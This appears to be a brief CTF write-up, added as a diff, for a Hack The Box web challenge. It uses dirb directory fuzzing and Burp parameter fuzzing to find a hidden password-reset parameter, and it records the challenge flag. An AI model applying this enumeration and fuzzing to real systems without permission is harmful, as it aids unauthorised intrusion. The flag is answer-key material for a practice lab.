@@ -1,0 +1,22 @@
+docker.hackthebox.eu:30593
+
+fuzz directory
+
+dirb http://docker.hackthebox.eu:30593/
+
+DIRECTORY: http://docker.hackthebox.eu:30593/api/  
+http://docker.hackthebox.eu:30593/api/action.php
+it give parameter not set 
+
+
+burp
+
+http://docker.hackthebox.eu:30593/api/action.php?FUZZ=test
+FUZZ = reset
+/api/action.php?reset=FUZZ
+FUZZ =20
+
+You successfully reset your password! Please use HTB{h0t_fuzz3r} to login.
+
+
+
